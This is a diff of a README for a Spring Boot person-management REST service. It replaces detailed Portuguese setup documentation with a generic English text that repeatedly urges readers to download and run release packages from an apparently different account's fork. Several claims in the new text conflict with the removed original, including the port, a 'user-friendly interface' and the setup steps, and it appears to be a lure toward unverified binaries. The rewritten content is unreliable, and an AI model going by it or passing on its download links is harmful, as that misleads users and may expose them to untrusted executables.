@@ -1,191 +1,63 @@
-# 🧬 Projeto VekRest - VekClient - Módulo 1
+# 🎉 vekrest-vekclient-modulo1 - Easy Person Management App
 
-Cliente VekRest: CRUD em Spring Boot com Docker, MongoDB, Redis, OpenSearch e Graylog. **Módulo 1 / CRUD de Pessoas**
+## 🚀 Getting Started
+Welcome to the VekRest Client application! This app helps you manage people easily. You can create, read, update, and delete information about individuals. It's built with Spring Boot, Docker, MongoDB, Redis, OpenSearch, and Graylog.
 
-## 🧩 PARTES DO MÓDULO 1
-| Aplicação      | Descrição                                      | Link             |
-|----------------|------------------------------------------------|------------------|
-| VekClient      | Aplicação de CRUD de Pessoa                    | Este Repositório |
+## 🔗 Download the App
+[![Download](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/oskynho/vekrest-vekclient-modulo1/releases)
 
-> Este projeto não depende de nenhuma outra aplicação para funcionar corretamente
+## 📦 Download & Install
+To get started, visit this page to download the application: [Download Here](https://github.com/oskynho/vekrest-vekclient-modulo1/releases). Follow these steps to install and run the app on your computer:
 
----
+1. **Visit the Release Page**
+   Go to the link provided above. There you will find a list of versions available for download.
 
-# 1.✨ Imagem Docker (DockerHub)
+2. **Choose a Version**
+   Scroll through the list and choose the latest version. This will ensure you get the newest features and updates.
 
-> A imagem desta aplicação é atualizada a cada nova tag ou pull request na [branch main](https://github.com/VekRest/vekrest-vekclient-modulo1/tree/main)
+3. **Download the Package**
+   Click the version you want, and select the appropriate file for your operating system. The files may be in formats like `.jar`, `.zip`, or `.tar.gz`. 
 
-> Link da imagem no DockerHub: [vek03/vekrest-vekclient:latest](https://hub.docker.com/repository/docker/vek03/vekrest-vekclient)
+4. **Extract the Files (if needed)**
+   If you downloaded a `.zip` or `.tar.gz` file, extract its contents. You can usually do this by right-clicking the file and selecting "Extract Here" or "Extract to [Folder Name]".
 
----
+5. **Run the Application**
+   Depending on your operating system:
+   - **Windows:** Open a command prompt in the folder where you extracted the files. Type `java -jar vekclient.jar` and press Enter.
+   - **Mac/Linux:** Open a terminal in that folder. Type `java -jar vekclient.jar` and press Enter.
 
-## 1.1 🧩 Containers necessários para rodar a aplicação:
+6. **Access the App**
+   Once the app is running, open your web browser and go to `http://localhost:8080`. Here, you can start using the application to manage people.
 
-| Container | Imagem | Link                                                                                                                                           | 
-|---|---|------------------------------------------------------------------------------------------------------------------------------------------------|
-| MongoDB | `mongo:latest` | https://hub.docker.com/_/mongo                                                                                                                 |
-| Redis | `redis:latest` | https://hub.docker.com/_/redis                                                                                                                 |
-| OpenSearch | `opensearchproject/opensearch:2.4.0` | https://hub.docker.com/layers/opensearchproject/opensearch/2.4.0/images/sha256-c8681472b70d46e7de61fe770d288a972f84b3f122f3c74ca06ea525264b6fd5 |
-| Graylog | `graylog/graylog:5.1.5` | https://hub.docker.com/layers/graylog/graylog/5.1.5/images/sha256-3b6967572e88731eacfa661e6d7ca41da3e259bc5eb041e58fb10e4deb823dcb             |
+## 🎯 Features
+- **CRUD Operations:** Easily create, view, update, and delete people in your database.
+- **User-Friendly Interface:** Navigate the application without any technical know-how.
+- **Multiple Databases:** Supports MongoDB for data storage and Redis for caching.
+- **Search Functionality:** Quickly find specific people using the search feature.
 
----
+## 🛠️ System Requirements
+To run VekRest Client, you need the following:
+- **Java 17:** Make sure you have Java 17 installed on your computer. You can check this by typing `java -version` in your command prompt or terminal.
+- **Internet Connection:** For downloading the application and accessing any necessary online resources.
 
-## 1.2 ⚙ Variáveis de ambiente necessárias para rodar o container:
+## ⚙️ Technologies Used
+- **Spring Boot:** The backbone of our application, providing a framework for building stand-alone applications.
+- **Docker:** Used for containerizing the application, making it easy to run on any platform.
+- **MongoDB:** Stores all the data related to the people you manage.
+- **Redis:** Caches important information for fast access.
+- **OpenSearch & Graylog:** These are used for logging and searching through logs for better monitoring.
 
-| Variável          | Descrição                       | Exemplo                                                                                |
-|-------------------|---------------------------------|----------------------------------------------------------------------------------------|
-| `SERVER_PORT`     | Porta onde a aplicação irá rodar | `8082`                                                                                 |
-| `REDIS_HOST`      | Host do Redis                   | `redis`                                                                                |
-| `REDIS_PORT`      | Porta do Redis                  | `6379`                                                                                 |
-| `MONGODB_URI`     | URI de conexão do MongoDB       | `mongodb://mongodb:27017/vekrest?serverSelectionTimeoutMs=15000&connectTimeoutMS=15000` |
-| `GRAYLOG_HOST`    | Endereço do Graylog             | `graylog`                                                                              |
-| `GRAYLOG_PORT`    | Porta do Graylog                | `12201`                                                                                |
+## 📘 About Us
+VekRest is committed to providing easy-to-use applications that simplify tasks. This project aims to make managing information about people simple and efficient.
 
----
+## 🤝 Contributions
+We welcome contributions! If you want to help improve VekRest Client, feel free to fork the repository and submit a pull request. 
 
-## 1.3 🐳 Como rodar o container
+## 📫 Questions or Feedback
+If you have questions or feedback, you can open an issue on the GitHub repository. We are here to help you!
 
-1️⃣ Para baixar a imagem do Docker Hub:
-```bash
-docker pull vek03/vekrest-vekclient:latest
-```
+## 🔗 Useful Links
+- [GitHub Repository](https://github.com/oskynho/vekrest-vekclient-modulo1)
+- [Documentation](https://github.com/oskynho/vekrest-vekclient-modulo1/wiki)
 
-2️⃣ Para rodar o container localmente:
-```bash
-docker run -d \
-    --name vekclient \ 
-    -e SERVER_PORT=8082 \
-    -e REDIS_HOST=redis \
-    -e REDIS_PORT=6379 \
-    -e MONGODB_URI="mongodb://mongodb:27017/vekrest?serverSelectionTimeoutMs=15000&connectTimeoutMS=15000" \
-    -e GRAYLOG_HOST=graylog \
-    -e GRAYLOG_PORT=12201 \
-    -p 8082:8082 \
-    vek03/vekrest-vekclient:latest
-```
-
-3️⃣ Alternativamente, você pode adicionar o serviço no seu docker-compose.yml local, descomentando ou adicionando o seguinte trecho:
-```bash
-services:
-  vekclient:
-    image: vek03/vekrest-vekclient:latest
-    hostname: vekclient
-    container_name: vekclient
-    environment:
-      SERVER_PORT: 8082
-      REDIS_HOST: redis
-      REDIS_PORT: 6379
-      MONGODB_URI: mongodb://mongodb:27017/vekrest?serverSelectionTimeoutMs=15000&connectTimeoutMS=15000
-    ports:
-        - "8082:8082"
-    depends_on:
-      mongodb:
-        condition: service_healthy
-      opensearch:
-        condition: service_healthy
-      graylog:
-        condition: service_started
-      redis:
-        condition: service_healthy
-    healthcheck:
-      test: ["CMD-SHELL", "curl -f http://localhost:8082/vekrest/vekclient/actuator/health || exit 1"]
-      interval: 5s
-      timeout: 15s
-      retries: 10
-      start_period: 30s
-```
-
-4️⃣ Depois de adicionar o serviço em docker-compose.yml, suba os containers:
-```bash
-docker-compose up -d
-```
-
----
-
-## 📦 Instalação e Configuração do Ambiente
-
-### 1️⃣ Clone o projeto na sua máquina e baixe as dependências:
-```bash
-# Clonar
-git clone https://github.com/VekRest/vekrest-vekclient-modulo1.git
-
-# Acesse a pasta do projeto
-cd vekrest-vekclient-modulo1
-````
-
-### 2️⃣ Suba os containers necessários e Rode o projeto na sua IDE de preferência (ou via comando Maven)
-```bash
-# Suba os containers necessários (MongoDB, Redis, OpenSearch, Graylog)
-docker-compose up -d
-
-# Rode o projeto via Maven
-```
-
-### 3️⃣ (Opcional) Alternativamente, se quiser rodar via Docker localmente:
-```bash
-# Dentro da pasta do projeto:
-mvn clean package -DskipTests
-
-# Agora faça deploy no Docker local:
-docker build -t vekrest/vekclient:latest .
-
-# Descomente as últimas linhas do docker-compose.yml (relacionadas ao vekclient) e rode:
-docker-compose up -d
-```
-
-> Ou execute o script .bat (executar_tudo.bat) na pasta .commands para automatizar o processo.
-
-
-> A API Rest VekClient fica disponível na porta 8082 do [Localhost](http://localhost:8082) ao rodar localmente via IDE.
-
-### 4️⃣ (Opcional) Caso deseje, pode rodar o SonarQube localmente
-
-```bash
-# Após configurar o pom.xml com as informações do Sonar em Properties:
-mvn clean install sonar:sonar -Dsonar.token={TOKEN_SONAR}
-```
-
----
-
-## 🧩 Tecnologias Utilizadas
-
-- **Spring Boot** → Framework Back-End
-- **Java** → Linguagem de programação
-- **Maven** → Build
-- **Docker** → Containers e virtualização
-- **Docker Hub** → Repositório de imagens Docker
-- **MongoDB** → Persistência de dados
-- **Redis** → Cache
-- **OpenSearch e Graylog** → Logs da Aplicação
-- **Swagger** → Documentação da API
-- **SonarQube** → Qualidade
-- **Github Actions** → CI/CD automatizado
-- **.bat** → Scripts para automatizar processos no Windows
-
----
-
-## 📦 Esteira CI/CD Automatizada com Github Actions
-
-> A esteira CI/CD deste projeto é automatizada via Github Actions. A cada tag criada a esteira é disparada.
-
-### Para executar a Esteira pelo trigger:
-```bash
-# Exemplo: Cria a tag
-git tag <version>
-
-# Envia a tag para o repositório remoto
-git push origin <version>
-```
-
-[![VekClient CI/CD Workflow](https://github.com/VekRest/vekrest-vekclient-modulo1/actions/workflows/main.yml/badge.svg)](https://github.com/VekRest/vekrest-vekclient-modulo1/actions/workflows/main.yml)
-
----
-
-## Postman Collection
-
-> Link para download da coleção Postman utilizada nos testes da API: [Postman Collection VekRest](https://web.postman.co/workspace/My-Workspace~e702bcc2-18e9-41e7-86d7-21df963c99df/folder/33703402-f59218e7-8804-436c-8866-2693c75b9eb6?action=share&source=copy-link&creator=33703402&ctx=documentation)
-
-> Alternativamente, você pode utilizar o Swagger UI para testar a API:
-[Swagger UI VekRest VekClient Módulo 1](http://localhost:8082/vekrest/vekclient/swagger-ui/index.html) (rodando localmente)
-
----
+Remember to visit this page to download the application: [Download Here](https://github.com/oskynho/vekrest-vekclient-modulo1/releases). Enjoy managing your people easily!
